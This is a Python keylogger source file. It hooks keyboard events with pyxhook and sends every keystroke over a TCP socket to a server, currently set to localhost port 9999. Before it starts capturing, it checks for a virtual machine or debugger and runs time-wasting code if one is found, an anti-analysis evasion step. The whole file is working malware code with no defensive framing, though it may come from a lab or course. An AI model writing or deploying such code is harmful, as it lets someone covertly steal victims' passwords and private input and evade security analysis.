import socket
import pyxhook

from sys import stdout

from RunningEnvironment import RunningEnvironment
from WasteTime import WasteTime

HOST, PORT = "localhost", 9999

def onKeyPress(event):
    global captureKeys
    ################################################################
    # Make connection
    ################################################################
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
        # Connect to server and send data
        sock.connect((HOST, PORT))
        sock.sendall(bytes(event.Key + "\n", "utf-8"))
        sock.close()

def main():
    captureKeys = True
    ################################################################
    # Check if program is running in a virtual machine or a debugger
    ################################################################
    runEnv = RunningEnvironment()
    runEnv.checkVM()
    runEnv.checkDebugger()

    if runEnv.isCompromised:
        # Perform useless operations
        WasteTime.run()

    ################################################################
    # HookKernel
    ################################################################
    hook = pyxhook.HookManager()
    hook.KeyDown = onKeyPress
    hook.HookKeyboard()
    hook.start()

    while captureKeys:
        pass

    hook.cancel()

    return

if __name__ == "__main__":
    main()
